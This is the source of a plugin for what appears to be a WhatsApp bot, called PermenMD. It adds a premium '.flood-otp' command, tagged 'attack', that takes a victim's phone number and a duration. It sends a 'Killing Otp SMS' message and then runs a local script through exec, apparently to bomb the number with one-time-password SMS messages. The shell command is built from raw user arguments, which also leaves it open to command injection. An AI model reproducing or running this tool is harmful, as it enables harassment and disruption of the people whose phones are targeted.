const { exec } = require('child_process')


const handler = async (m, { args }) => {
    if (args.length < 2) {
        m.reply(`
\`\`\`[🔍] .flood-otp <number> <duration>\`\`\``)
        return;
    }

    const target = args[0];
    const duration = args[1];

conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title:  global.title,
body: `This Action Will Make A Deadly Move`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: global.attacking,
sourceUrl: ``
}}, text: `\`Killing Otp SMS\`
\`Target:\` ${target}
\`Duration:\` ${duration} Seconds
\`Creator:\` PermenMD`}, {quoted: m})
    exec(`node ./lib/PermenMD/StarsXTemp.js +${target} ${duration}`);
}

handler.help = ['flood-otp']
handler.tags = ['tools', 'attack'];
handler.premium = true
handler.command = /^(flood-otp)$/i;
module.exports = handler
